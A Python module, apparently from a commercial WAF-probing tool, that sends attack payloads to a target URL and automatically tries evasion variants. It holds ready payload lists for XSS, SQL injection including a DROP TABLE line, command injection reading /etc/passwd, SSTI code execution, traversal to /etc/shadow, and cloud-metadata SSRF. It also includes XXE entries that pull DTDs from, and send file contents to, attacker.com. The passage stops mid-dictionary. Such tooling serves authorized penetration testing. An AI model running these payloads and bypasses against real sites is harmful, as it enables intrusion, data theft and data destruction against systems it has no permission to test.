"""
fray/pattern_probe.py — Per-pattern WAF probe mode (#261)

The core engine behind `fray analyze`:

  1. Probe each payload pattern individually to confirm WAF blocks it (403/406)
  2. For each blocked pattern, systematically test bypass variants
  3. Record the Blocked Pattern → WAF Response → Bypass table
  4. Optionally annotate with LLM explanation of WHY the bypass works

This is the missing piece between "WAF detected" and "here's what gets through
and why". It's the commercial differentiator for Fray Pro.

Usage:
    from fray.pattern_probe import probe_patterns, format_bypass_table

    results = probe_patterns(
        target="https://target.com/search?q=",
        param="q",
        patterns=_XSS_CANARY_PATTERNS,
        waf_vendor="cloudflare",
        timeout=5,
    )
    print(format_bypass_table(results))
"""

import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple


# ── Canary patterns — minimal strings that trigger specific WAF rules ─────────
# Each pattern targets one WAF rule category. We use the simplest possible
# string that triggers the block — NOT a full exploit payload.
# Goal: confirm the rule exists and then find what bypasses it.

XSS_CANARY_PATTERNS: List[Tuple[str, str]] = [
    ("<script>alert(1)</script>",    "XSS: basic script tag"),
    ("javascript:alert(1)",          "XSS: javascript: protocol"),
    ("<img onerror=alert(1)>",       "XSS: event handler attribute"),
    ("<svg onload=alert(1)>",        "XSS: SVG onload"),
    ("alert(document.cookie)",       "XSS: cookie access"),
    ("'><script>alert(1)</script>",  "XSS: attribute break + script"),
    ("<iframe src=javascript:1>",    "XSS: iframe javascript src"),
    ("document.write(1)",            "XSS: document.write"),
    ("eval(atob('YWxlcnQoMSk='))",  "XSS: eval(atob()) obfuscation"),
    ("<!--<script>alert(1)</script>-->", "XSS: HTML comment bypass"),
]

SQLI_CANARY_PATTERNS: List[Tuple[str, str]] = [
    ("' OR '1'='1",                      "SQLi: OR-based auth bypass"),
    ("1 UNION SELECT NULL--",            "SQLi: UNION-based"),
    ("1' AND SLEEP(5)--",               "SQLi: MySQL time-based blind"),
    ("' OR 1=1--",                       "SQLi: classic OR"),
    ("1; DROP TABLE users--",            "SQLi: stacked queries"),
    ("' AND 1=2 UNION SELECT 1,2--",    "SQLi: UNION 2-column"),
    ("1 AND 1=CONVERT(int,@@version)",   "SQLi: MSSQL version"),
    ("1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "SQLi: MySQL error-based"),
    ("1 AND (SELECT * FROM(SELECT(SLEEP(5)))a)--",      "SQLi: MySQL blind via subquery"),
    ("'; WAITFOR DELAY '0:0:5'--",      "SQLi: MSSQL time-based blind"),
    ("1 ORDER BY 10--",                 "SQLi: column count (ORDER BY)"),
    ("' AND 1=1 AND 'x'='x",           "SQLi: boolean blind true"),
]

CMDI_CANARY_PATTERNS: List[Tuple[str, str]] = [
    ("; id",                "CMDi: semicolon separator"),
    ("| id",                "CMDi: pipe separator"),
    ("&& id",               "CMDi: AND separator"),
    ("`id`",                "CMDi: backtick execution"),
    ("$(id)",               "CMDi: subshell execution"),
    ("; whoami #",          "CMDi: whoami with comment"),
    ("| whoami",            "CMDi: pipe whoami"),
    (";cat /etc/passwd",    "CMDi: file read"),
    ("& ping -c 1 127.0.0.1 &", "CMDi: background ping"),
    ("||(id)",              "CMDi: OR operator subshell"),
    ("%0aid%0a",            "CMDi: newline encoded"),
    ("{id}",                "CMDi: brace expansion"),
]

SSTI_CANARY_PATTERNS: List[Tuple[str, str]] = [
    ("{{7*7}}",                              "SSTI: Jinja2/Twig math"),
    ("${7*7}",                               "SSTI: FreeMarker/Groovy"),
    ("<%=7*7%>",                             "SSTI: ERB/JSP"),
    ("#{7*7}",                               "SSTI: Ruby/OGNL"),
    ("*{7*7}",                               "SSTI: Spring SpEL"),
    ("{{config}}",                           "SSTI: Jinja2 config object"),
    ("{{''.__class__.__mro__}}",             "SSTI: Jinja2 MRO traversal"),
    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "SSTI: FreeMarker Execute"),
    ("{{request.application.__globals__}}", "SSTI: Flask globals"),
    ("@{7*7}",                              "SSTI: Thymeleaf expression"),
    ("<%= 7*7 %>",                          "SSTI: ASP/EJS"),
    ("{{7*'7'}}",                           "SSTI: Twig vs Jinja2 discriminator"),
]

PATH_TRAVERSAL_PATTERNS: List[Tuple[str, str]] = [
    ("../../../etc/passwd",              "Path traversal: basic Unix"),
    ("..\\..\\..\\windows\\system32",    "Path traversal: Windows backslash"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Path traversal: URL-encoded"),
    ("....//....//etc/passwd",           "Path traversal: double-slash bypass"),
    ("/etc/passwd",                      "Path traversal: absolute path"),
    ("..%252f..%252f..%252fetc%252fpasswd", "Path traversal: double-encoded"),
    ("%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "LFI: URL-encoded with /"),
    ("php://filter/convert.base64-encode/resource=index.php", "LFI: PHP filter wrapper"),
    ("../../../etc/shadow",             "Path traversal: shadow file"),
    ("..%c0%af..%c0%afetc%c0%afpasswd", "Path traversal: overlong UTF-8"),
    ("..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "Path traversal: Unicode fullwidth /"),
    ("file:///etc/passwd",              "Path traversal: file:// wrapper"),
]

SSRF_CANARY_PATTERNS: List[Tuple[str, str]] = [
    ("http://169.254.169.254/latest/meta-data/",   "SSRF: AWS IMDS"),
    ("http://metadata.google.internal/computeMetadata/v1/", "SSRF: GCP metadata"),
    ("http://169.254.169.254/metadata/instance",   "SSRF: Azure metadata"),
    ("http://localhost/",                           "SSRF: localhost"),
    ("http://127.0.0.1:22/",                       "SSRF: localhost SSH"),
    ("file:///etc/passwd",                         "SSRF: file:// protocol"),
    ("dict://localhost:11211/stats",               "SSRF: Memcached DICT"),
    ("gopher://localhost:9200/_search",            "SSRF: Elasticsearch gopher"),
    ("http://0.0.0.0:80/",                         "SSRF: 0.0.0.0 localhost"),
    ("http://[::]:80/",                            "SSRF: IPv6 loopback"),
    ("http://2130706433/",                         "SSRF: decimal localhost"),
    ("http://0x7f000001/",                         "SSRF: hex localhost"),
]

OPEN_REDIRECT_PATTERNS: List[Tuple[str, str]] = [
    ("//evil.com",                     "Open redirect: protocol-relative"),
    ("\\\\evil.com",                   "Open redirect: backslash bypass"),
    ("https://evil.com",               "Open redirect: absolute URL"),
    ("/%5cevil.com",                   "Open redirect: encoded backslash"),
    ("//evil%2ecom",                   "Open redirect: encoded dot"),
    ("///evil.com",                    "Open redirect: triple slash"),
    ("https:evil.com",                 "Open redirect: missing // bypass"),
    ("javascript:alert(1)",            "Open redirect: javascript protocol"),
    ("//evil.com%23@target.com",       "Open redirect: # confusion"),
    ("https://target.com.evil.com",    "Open redirect: domain confusion"),
    ("//evil.com/%2f..",               "Open redirect: path confusion"),
]

HOST_HEADER_PATTERNS: List[Tuple[str, str]] = [
    ("X-Forwarded-Host: evil.com",       "Host header: X-Forwarded-Host"),
    ("X-Host: evil.com",                 "Host header: X-Host"),
    ("X-Forwarded-Server: evil.com",     "Host header: X-Forwarded-Server"),
    ("X-HTTP-Host-Override: evil.com",   "Host header: X-HTTP-Host-Override"),
    ("Forwarded: host=evil.com",         "Host header: RFC 7239 Forwarded"),
    ("Host: evil.com",                   "Host header: direct Host override"),
    ("X-Original-URL: /admin",           "Host header: X-Original-URL override"),
    ("X-Rewrite-URL: /admin",            "Host header: X-Rewrite-URL override"),
    ("X-Forwarded-Port: 443",            "Host header: port manipulation"),
    ("X-Forwarded-Prefix: /admin",       "Host header: path prefix injection"),
]

CORS_PATTERNS: List[Tuple[str, str]] = [
    ("Origin: https://evil.com",            "CORS: arbitrary origin"),
    ("Origin: null",                        "CORS: null origin"),
    ("Origin: https://evil.target.com",     "CORS: subdomain spoofing"),
    ("Origin: https://target.com.evil.com", "CORS: postfix bypass"),
    ("Origin: https://target.evil.com",     "CORS: prefix bypass"),
    ("Origin: http://localhost",            "CORS: localhost origin"),
    ("Origin: https://target.com_evil.com", "CORS: underscore bypass"),
    ("Origin: ",                            "CORS: empty origin value"),
    ("Origin: https://evil.com\r\n",        "CORS: CRLF injection"),
    ("Access-Control-Request-Method: PUT",  "CORS: preflight method abuse"),
]

PROTOTYPE_POLLUTION_PATTERNS: List[Tuple[str, str]] = [
    ("__proto__[polluted]=true",                 "Proto pollution: __proto__ bracket"),
    ("constructor.prototype.polluted=true",      "Proto pollution: constructor chain"),
    ("__proto__.polluted=true",                  "Proto pollution: __proto__ dot"),
    ("__proto__[__proto__][polluted]=true",      "Proto pollution: nested"),
    ("constructor[prototype][polluted]=true",    "Proto pollution: bracket notation"),
    ("Object.prototype.polluted=true",           "Proto pollution: Object.prototype"),
    ("{\"__proto__\":{\"polluted\":true}}",       "Proto pollution: JSON body"),
    ("a[__proto__][polluted]=true",              "Proto pollution: key prefix"),
    ("__proto__[admin]=true",                    "Proto pollution: admin flag"),
    ("constructor.constructor('alert(1)')()",    "Proto pollution: RCE via constructor"),
]

CACHE_POISON_PATTERNS: List[Tuple[str, str]] = [
    ("X-Forwarded-Host: evil.com",      "Cache poison: X-Forwarded-Host"),
    ("X-Original-URL: /admin",          "Cache poison: X-Original-URL"),
    ("X-Rewrite-URL: /admin",           "Cache poison: X-Rewrite-URL"),
    ("X-Forwarded-Prefix: /prefix",     "Cache poison: X-Forwarded-Prefix"),
    ("Trailer: X-Injected-Header",      "Cache poison: Trailer header"),
    ("X-Host: evil.com",                "Cache poison: X-Host"),
    ("X-Forwarded-Scheme: http",        "Cache poison: scheme downgrade"),
    ("X-Forwarded-For: 127.0.0.1",     "Cache poison: internal IP forge"),
    ("X-HTTP-Method-Override: DELETE",  "Cache poison: method override"),
    ("X-Original-Host: evil.com",       "Cache poison: X-Original-Host"),
]

AUTH_BYPASS_PATTERNS: List[Tuple[str, str]] = [
    ("' OR '1'='1'--",                   "Auth bypass: SQLi OR login"),
    ("admin'--",                         "Auth bypass: SQLi admin comment"),
    ("true",                             "Auth bypass: JSON boolean"),
    ("1",                                "Auth bypass: numeric (type juggling)"),
    ("none",                             "Auth bypass: JWT alg:none"),
    ("{\"$gt\": \"\"}",                  "Auth bypass: NoSQL $gt"),
    ("admin\" #",                        "Auth bypass: MySQL hash comment"),
    ("{\"$regex\":\".*\"}",              "Auth bypass: NoSQL $regex wildcard"),
    ("0' OR '0'='0",                     "Auth bypass: alternate OR"),
    ("' OR 1=1 LIMIT 1--",              "Auth bypass: LIMIT bypass"),
    ("eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.", "Auth bypass: JWT alg:none token"),
]

GRAPHQL_PATTERNS: List[Tuple[str, str]] = [
    ("{__schema{types{name}}}",                  "GraphQL: schema introspection"),
    ("{__typename}",                             "GraphQL: typename probe"),
    ("{user{password}}",                         "GraphQL: sensitive field"),
    ("query{users{id email password}}",          "GraphQL: mass extraction"),
    ("{...{password}}",                          "GraphQL: inline fragment bypass"),
    ("{__schema{queryType{name}}}",              "GraphQL: query type probe"),
    ("[{\"query\":\"{__schema{types{name}}}\"},{\"query\":\"{__schema{types{name}}}\"}]",
     "GraphQL: batch introspection DoS"),
    ("{users(limit:999999){id email}}",          "GraphQL: resource exhaustion"),
    ("{__type(name:\"User\"){fields{name}}}",    "GraphQL: field enumeration"),
    ("mutation{deleteUser(id:1){id}}",           "GraphQL: unauthorized mutation"),
]

XXE_PATTERNS: List[Tuple[str, str]] = [
    # Classic file read
    ("<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
     "XXE: file:// read /etc/passwd"),
    # SSRF via XXE
    ("<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><test>&xxe;</test>",
     "XXE: SSRF to AWS metadata"),
    # DTD external entity
    ("<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
     "XXE: DTD external entity"),
    # Parameter entity OOB
    ("<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\"> %xxe;]>",
     "XXE: parameter entity OOB"),
    # Billion laughs DoS
    ("<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>",
     "XXE: Billion Laughs DoS"),
    # PHP filter wrapper
    ("<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY sp SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><r>&sp;</r>",
     "XXE: PHP filter base64"),
    # Windows file read
    ("<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><test>&xxe;</test>",
     "XXE: Windows file read"),
    # UTF-7 encoding bypass
    ("<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADwAIQ-DOCTYPE foo [+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI->]+AD4A",
     "XXE: UTF-7 encoding bypass"),
    # Error-based XXE
    ("<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"nonexistent\">]><test>&xxe;</test>",
     "XXE: error-based (invalid path)"),
    # Nested entity
    ("<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\"> %eval; %exfil;]>",
     "XXE: nested OOB exfiltration"),
]

# Maps category name → canary patterns
PATTERN_SETS: Dict[str, List[Tuple[str, str]]] = {
    "xss":                XSS_CANARY_PATTERNS,
    "sqli":               SQLI_CANARY_PATTERNS,
    "cmdi":               CMDI_CANARY_PATTERNS,
    "ssti":               SSTI_CANARY_PATTERNS,
    "path_traversal":     PATH_TRAVERSAL_PATTERNS,
    "lfi":                PATH_TRAVERSAL_PATTERNS,   # alias
    "ssrf":               SSRF_CANARY_PATTERNS,
    "open_redirect":      OPEN_REDIRECT_PATTERNS,
    "host_header":        HOST_HEADER_PATTERNS,
    "cors":               CORS_PATTERNS,
    "prototype_pollution": PROTOTYPE_POLLUTION_PATTERNS,
    "cache_poison":       CACHE_POISON_PATTERNS,
    "auth_bypass":        AUTH_BYPASS_PATTERNS,
    "graphql":            GRAPHQL_PATTERNS,
    "xxe":                XXE_PATTERNS,
}


# ── Bypass variant generators ─────────────────────────────────────────────────
# For each blocked pattern, generate bypass variants using encoding/evasion.
# We try the cheapest techniques first (encoding) before structural changes.

def _generate_xss_bypasses(pattern: str) -> List[Tuple[str, str]]:
    """Generate XSS bypass variants for a blocked pattern."""
    bypasses = []

    # 1. Null byte injection
    p = pattern.replace("<", "<\x00")
    bypasses.append((p, "Null byte before < (WAF may skip null bytes)"))

    # 2. Uppercase tags
    p = pattern.upper()
    bypasses.append((p, "Uppercase tag (case-insensitive bypass)"))

    # 3. HTML entity encoding of < >
    p = pattern.replace("<", "&lt;").replace(">", "&gt;")
    # Probably won't work but confirms if WAF decodes entities
    bypasses.append((p, "HTML entity encoding"))

    # 4. Double URL encoding — encode the already-single-encoded form
    # WAF sees: %253Cscript%253E (double encoded)
    # Browser decodes to: %3Cscript%3E → <script>
    p = urllib.parse.quote(urllib.parse.quote(pattern, safe=""), safe="")
    bypasses.append((p, "Double URL encoding"))

    # 5. Unicode fullwidth characters
    p = pattern.replace("<", "\uff1c").replace(">", "\uff1e")
    bypasses.append((p, "Unicode fullwidth < > (U+FF1C/FF1E)"))

    # 6. Tab/newline injection in tag
    p = pattern.replace("<script>", "<scr\tipt>")
    bypasses.append((p, "Tab in tag name"))

    # 7. SVG alternative when script blocked
    if "script" in pattern.lower():
        p = "<svg/onload=alert(1)>"
        bypasses.append((p, "SVG/onload (no space, no script tag)"))
        p = "<img src=x onerror=alert`1`>"
        bypasses.append((p, "Backtick args bypass parenthesis filter"))

    # 8. Comma operator technique (bypasses alert( filter)
    if "alert(" in pattern:
        p = pattern.replace("alert(", "(0,alert)(")
        bypasses.append((p, "Comma operator: (0,alert)(1) — indirect reference"))

    # 9. String concatenation
    if "alert" in pattern.lower():
        p = pattern.replace("alert", "al"+"ert")
        bypasses.append((p, "String concatenation bypass"))
        p = pattern.replace("alert", "window['al'+'ert']")
        bypasses.append((p, "Bracket notation with concatenation"))

    # 10. Case-sensitivity evasion
    if "onerror" in pattern.lower():
        p = pattern.replace("onerror", "ONERROR")
        bypasses.append((p, "Uppercase event handler"))

    return bypasses[:8]  # cap at 8 variants per pattern


def _generate_sqli_bypasses(pattern: str) -> List[Tuple[str, str]]:
    """Generate SQLi bypass variants for a blocked pattern."""
    bypasses = []

    # Comment variations
    p = pattern.replace("--", "#")
    bypasses.append((p, "MySQL # comment instead of --"))

    p = pattern.replace("--", "/**/")
    bypasses.append((p, "Inline comment /**/ bypass"))

    # Space alternatives
    p = pattern.replace(" ", "/**/")
    bypasses.append((p, "/**/ instead of spaces"))

    p = pattern.replace(" ", "%09")
    bypasses.append((p, "Tab character instead of spaces"))

    # Case variation
    p = pattern.replace("UNION", "UnIoN").replace("SELECT", "SeLeCt")
    bypasses.append((p, "Mixed case keywords"))

    # URL encoding
    p = urllib.parse.quote(pattern)
    bypasses.append((p, "URL-encoded payload"))

    # Double URL encoding
    p = urllib.parse.quote(urllib.parse.quote(pattern))
    bypasses.append((p, "Double URL encoding"))

    # OR alternatives
    if "OR" in pattern.upper():
        p = re.sub(r'\bOR\b', '||', pattern, flags=re.IGNORECASE)
        bypasses.append((p, "|| instead of OR"))

    return bypasses[:6]


def _generate_path_traversal_bypasses(pattern: str) -> List[Tuple[str, str]]:
    """Generate path traversal / LFI bypass variants."""
    bypasses = []
    # 1. URL encode ../
    p = pattern.replace("../", "%2e%2e%2f")
    bypasses.append((p, "URL-encode ../ → %2e%2e%2f"))
    # 2. Double encode
    p = pattern.replace("../", "%252e%252e%252f")
    bypasses.append((p, "Double-encode ../ → %252e%252e%252f"))
    # 3. Slash variation ....//
    p = pattern.replace("../", "....//")
    bypasses.append((p, "....// bypass (double-dot-slash)"))
    # 4. Backslash on Windows targets
    p = pattern.replace("/", "\\")
    bypasses.append((p, "Backslash for Windows path"))
    # 5. Null byte terminator (PHP <5.3)
    p = pattern + "\x00.jpg"
    bypasses.append((p, "Null byte terminator"))
    # 6. Unicode separator
    p = pattern.replace("/", "\u2215")  # ∕ division slash
    bypasses.append((p, "Unicode division slash U+2215"))
    return bypasses[:6]


def _generate_ssrf_bypasses(pattern: str) -> List[Tuple[str, str]]:
    """Generate SSRF bypass variants."""
    bypasses = []
    # 1. Decimal IP (169.254.169.254 → 2852039166)
    if "169.254.169.254" in pattern:
        bypasses.append((pattern.replace("169.254.169.254", "2852039166"),
                         "Decimal IP: 169.254.169.254 → 2852039166"))
        bypasses.append((pattern.replace("169.254.169.254", "0xa9fea9fe"),
                         "Hex IP: 0xa9fea9fe"))
        bypasses.append((pattern.replace("169.254.169.254", "169.254.169.254.xip.io"),
                         "DNS rebinding via xip.io"))
    # 2. localhost alternatives
    if "localhost" in pattern or "127.0.0.1" in pattern:
        bypasses.append((pattern.replace("localhost", "127.0.0.1"), "127.0.0.1"))
        bypasses.append((pattern.replace("localhost", "0.0.0.0"), "0.0.0.0"))
        bypasses.append((pattern.replace("localhost", "[::]"), "IPv6 [::]"))
        bypasses.append((pattern.replace("localhost", "0177.0.0.1"), "Octal IP"))
    # 3. Protocol switching
    if pattern.startswith("http://"):
        bypasses.append((pattern.replace("http://", "https://"), "HTTPS protocol switch"))
        bypasses.append((pattern.replace("http://", "dict://"), "dict:// protocol"))
        bypasses.append((pattern.replace("http://", "gopher://"), "gopher:// protocol"))
    return bypasses[:6]


def _generate_open_redirect_bypasses(pattern: str) -> List[Tuple[str, str]]:
    """Generate open redirect bypass variants."""
    return [
        (pattern.replace("evil.com", "evil%2ecom"),          "Encoded dot in domain"),
        (pattern.replace("//", "///"),                       "Triple slash"),
        (pattern.replace("//", "\\/\\/"),                    "Backslash bypass"),
        (pattern + "@evil.com",                              "@ confusion"),
        ("/%09/evil.com",                                    "Tab before path"),
        ("/%0a/evil.com",                                    "Newline bypass"),
    ][:6]


def _generate_header_injection_bypasses(pattern: str) -> List[Tuple[str, str]]:
    """Generate header injection bypass variants (host header, cache poison)."""
    return [
        (pattern + ":80",                    "Add port number"),
        (pattern + ":443",                   "Add HTTPS port"),
        (pattern.replace(".com", ".com."),   "Trailing dot"),
        (f"X-Forwarded-For: {pattern}",      "X-Forwarded-For alternative"),
        (f"X-Real-IP: {pattern}",            "X-Real-IP header"),
        (f"Forwarded: for={pattern}",        "RFC 7239 Forwarded header"),
    ][:6]


def _generate_bypasses(pattern: str, category: str) -> List[Tuple[str, str]]:
    """Generate bypass variants based on category."""
    if category in ("xss",):
        return _generate_xss_bypasses(pattern)
    elif category in ("sqli",):
        return _generate_sqli_bypasses(pattern)
    elif category in ("path_traversal", "lfi"):
        return _generate_path_traversal_bypasses(pattern)
    elif category in ("ssrf",):
        return _generate_ssrf_bypasses(pattern)
    elif category in ("open_redirect",):
        return _generate_open_redirect_bypasses(pattern)
    elif category in ("host_header", "cache_poison"):
        return _generate_header_injection_bypasses(pattern)
    elif category in ("prototype_pollution",):
        return [
            (pattern.replace("__proto__", "constructor.prototype"), "constructor.prototype alias"),
            (pattern.replace("[", "%5b").replace("]", "%5d"),       "URL-encode brackets"),
            (pattern.replace(".", "%2e"),                            "URL-encode dots"),
            (pattern + "&__proto__[x]=1",                           "Append second proto param"),
            (pattern.replace("=true", "=test%0d%0a"),               "CRLF injection suffix"),
            (pattern.replace("__proto__", "[[Prototype]]"),         "[[Prototype]] alternate"),
        ][:6]
    elif category in ("xxe",):
        return [
            # XXE bypasses: encoding the DOCTYPE/ENTITY to evade keyword filters
            ("<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADwAIQ-DOCTYPE+ACA-foo+ACA-[<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
             "UTF-7 encoding bypass"),
            ("<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\"> %xxe;]>",
             "Parameter entity via external DTD"),
            ("<!DOCTYPE foo SYSTEM \"http://attacker.com/malicious.dtd\">",
             "External DTD reference"),
            ("<?xml version=\"1.0\"?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY sp SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><r>&sp;</r>",
             "PHP filter wrapper XXE"),
        ][:4]
    elif category in ("cors",):
        return [
            # CORS bypasses
            (pattern.replace("evil.com", f"evil{chr(0x20)}.com"),   "Space in origin"),
            (pattern.replace("evil.com", "evil.com\r\n"),            "CRLF injection"),
            ("Origin: ",                                             "Empty Origin header"),
            ("Access-Control-Request-Headers: X-CSRF",              "Preflight header abuse"),
        ][:4]
    else:
        # Generic: encoding + case variation
        return [
            (urllib.parse.quote(pattern),                       "URL encoding"),
            (urllib.parse.quote(urllib.parse.quote(pattern)),   "Double URL encoding"),
            (pattern.replace(" ", "/**/"),                      "/**/ space replacement"),
            (pattern.upper(),                                    "Uppercase"),
            (pattern.replace("=", "%3d"),                       "Encode = sign"),
            (pattern + "/**/",                                   "Trailing comment"),
        ][:6]


# ── Core probe engine ─────────────────────────────────────────────────────────

_HEADER_ONLY_CATEGORIES = frozenset({
    "host_header", "cache_poison", "cors", "host_header_injection",
})

def _is_header_payload(payload: str) -> Optional[Tuple[str, str]]:
    """If payload looks like 'Header-Name: value', return (name, value). Else None."""
    if ": " in payload and not payload.startswith("<") and not payload.startswith("'"):
        parts = payload.split(": ", 1)
        name = parts[0].strip()
        # Valid header names: letters, digits, hyphens only
        if all(c.isalnum() or c in "-_" for c in name):
            return name, parts[1].strip()
    return None


def _http_probe(host: str, port: int, path: str, param: str,
                payload: str, use_ssl: bool, timeout: int) -> Tuple[int, Dict, str]:
    """Send GET request with payload in param or header. Returns (status, headers, body).

    Smart encoding:
    - Standard params: single URL-encode only (safe="!~*'()") so WAF sees the
      decoded form. Double-encoding bypasses are generated separately.
    - Header-format payloads ("X-Forwarded-Host: evil.com"): sent as HTTP header,
      not as query param.
    """
    try:
        import http.client, ssl as _ssl

        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE

        if use_ssl:
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        base_headers = {
            "Host": host,
            "User-Agent": "Mozilla/5.0 fray/3.5 (pattern-probe)",
            "Accept": "text/html,*/*",
        }

        # Detect header-format payloads
        hdr_pair = _is_header_payload(payload)
        if hdr_pair:
            # Send payload AS A REQUEST HEADER (host header injection, CORS, cache poison)
            h_name, h_val = hdr_pair
            base_headers[h_name] = h_val
            full_path = path if "?" in path else path
            conn.request("GET", full_path, headers=base_headers)
        else:
            # Standard query param injection
            # Use single URL-encoding with safe chars preserved so WAF sees intent
            encoded = urllib.parse.quote(payload, safe="!~*'()")
            if "?" in path:
                full_path = f"{path}&{param}={encoded}"
            else:
                full_path = f"{path}?{param}={encoded}"
            conn.request("GET", full_path, headers=base_headers)

        resp = conn.getresponse()
        body = resp.read(4096).decode("utf-8", errors="replace")
        hdrs = dict(resp.getheaders())
        conn.close()
        return resp.status, hdrs, body
    except Exception:
        return 0, {}, ""


def _is_blocked(status: int, body: str, waf_vendor: str = "") -> bool:
    """Determine if response indicates WAF block."""
    if status in (403, 406, 501, 429):
        return True
    # Soft blocks: 200 but with WAF block page
    if status == 200:
        block_signals = [
            "access denied", "blocked", "forbidden", "security violation",
            "bad request", "your request was blocked", "suspicious activity",
        ]
        body_lower = body.lower()
        if any(sig in body_lower for sig in block_signals):
            return True
    return False


def probe_patterns(
    target_url: str,
    param: str,
    category: str = "xss",
    patterns: Optional[List[Tuple[str, str]]] = None,
    waf_vendor: str = "",
    timeout: int = 5,
    delay: float = 0.2,
    max_patterns: int = 10,
    max_bypasses_per_pattern: int = 6,
) -> List[Dict[str, Any]]:
    """Core per-pattern WAF probe (#261).

    For each canary pattern:
    1. Send it to target_url?param=<pattern>
    2. If WAF blocks (403/406) → try bypass variants
    3. If bypass gets through → record as confirmed bypass

    Returns list of results, one per pattern:
    {
        "pattern":       str,        # raw pattern sent
        "description":   str,        # human label
        "waf_response":  int,        # HTTP status from WAF (403 etc)
        "blocked":       bool,       # True if WAF blocked it
        "bypasses": [
            {
                "payload":     str,   # bypass variant tried
                "technique":   str,   # description of the technique
                "status":      int,   # response status
                "blocked":     bool,  # False = bypass worked!
                "reflected":   bool,  # payload reflected in body
            }, ...
        ],
        "best_bypass":   dict | None, # first working bypass (not blocked)
        "confirmed_bypass": bool,     # True if any bypass worked
    }
    """
    from urllib.parse import urlparse

    parsed = urlparse(target_url)
    host = parsed.hostname or target_url
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"
    use_ssl = parsed.scheme == "https"

    if patterns is None:
        patterns = PATTERN_SETS.get(category, XSS_CANARY_PATTERNS)

    results: List[Dict[str, Any]] = []

    for pattern, description in patterns[:max_patterns]:
        entry: Dict[str, Any] = {
            "pattern":          pattern,
            "description":      description,
            "category":         category,
            "waf_vendor":       waf_vendor,
            "waf_response":     0,
            "blocked":          False,
            "bypasses":         [],
            "best_bypass":      None,
            "confirmed_bypass": False,
        }

        # Step 1: probe with raw pattern
        status, hdrs, body = _http_probe(host, port, path, param,
                                          pattern, use_ssl, timeout)
        entry["waf_response"] = status
        entry["blocked"] = _is_blocked(status, body, waf_vendor)

        if not entry["blocked"]:
            # Pattern not blocked — not a WAF rule boundary, still record
            results.append(entry)
            if delay:
                time.sleep(delay)
            continue

        # Step 2: try bypasses
        bypass_variants = _generate_bypasses(pattern, category)
        for bp_payload, bp_technique in bypass_variants[:max_bypasses_per_pattern]:
            if delay:
                time.sleep(delay * 0.5)  # faster for bypass attempts

            bp_status, bp_hdrs, bp_body = _http_probe(
                host, port, path, param, bp_payload, use_ssl, timeout
            )
            bp_blocked = _is_blocked(bp_status, bp_body, waf_vendor)

            # Check reflection (for XSS)
            reflected = False
            if not bp_blocked and bp_body:
                # Strip encoding from payload for reflection check
                plain = urllib.parse.unquote(bp_payload)
                reflected = (
                    plain.lower() in bp_body.lower() or
                    "onerror" in bp_body.lower() or
                    "onload" in bp_body.lower() or
                    "alert" in bp_body.lower()
                )

            bp_result = {
                "payload":   bp_payload,
                "technique": bp_technique,
                "status":    bp_status,
                "blocked":   bp_blocked,
                "reflected": reflected,
            }
            entry["bypasses"].append(bp_result)

            if not bp_blocked and entry["best_bypass"] is None:
                entry["best_bypass"] = bp_result
                entry["confirmed_bypass"] = True

        results.append(entry)
        if delay:
            time.sleep(delay)

    return results


def format_analysis_header(
    target_url: str,
    param: str,
    category: str,
    waf_vendor: str,
    results: List[Dict[str, Any]],
) -> str:
    """Explain what was probed and what each pattern category means."""
    _CAT_DESCRIPTIONS = {
        "xss":               "Cross-Site Scripting — injects executable scripts into page context",
        "sqli":              "SQL Injection — manipulates database queries via user input",
        "cmdi":              "Command Injection — executes OS commands via unsanitised input",
        "ssti":              "Server-Side Template Injection — executes code via template engine",
        "path_traversal":    "Path Traversal / LFI — reads arbitrary files from the server",
        "lfi":               "Local File Inclusion — reads server-side files via path parameter",
        "ssrf":              "Server-Side Request Forgery — makes server fetch internal URLs",
        "open_redirect":     "Open Redirect — sends users to attacker-controlled domain",
        "host_header":       "Host Header Injection — manipulates request routing / password reset",
        "cache_poison":      "Cache Poisoning — injects malicious content into CDN/proxy cache",
        "cors":              "CORS Misconfiguration — cross-origin data theft",
        "prototype_pollution": "Prototype Pollution — corrupts JS object prototypes",
